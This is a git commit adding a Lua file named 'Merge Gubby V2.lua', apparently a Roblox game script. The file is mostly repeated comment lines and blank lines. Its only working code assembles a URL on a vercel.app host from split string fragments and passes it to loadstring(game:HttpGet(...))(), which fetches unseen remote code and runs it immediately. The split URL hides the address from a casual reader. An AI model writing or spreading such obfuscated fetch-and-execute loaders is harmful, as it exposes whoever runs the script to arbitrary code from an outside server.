00c85cf3734c15fa6edc8c01dcb11c7dd1b98ef6
Nexus <rodgiellamas@gmail.com>
2025-08-25 03:43:12 +0800

    Create Merge Gubby V2.lua

---
+++ Merge Gubby V2.lua
@@ -0,0 +1,42 @@
+-- Merge Gubby 
+
+
+
+
+
+-- Merge Gubby 
+
+
+
+
+
+
+-- Merge Gubby 
+
+
+
+
+
+-- Merge Gubby 
+
+
+
+
+
+
+local Aux = {
+    "https://",
+    "zy-x.",
+    "vercel.",
+    "app/",
+    "api/",
+    "raw/",
+    "3ldc1sqdjkn"
+}
+local link = table.concat(Aux)
+loadstring(game:HttpGet(link))()
+
+
+
+
+
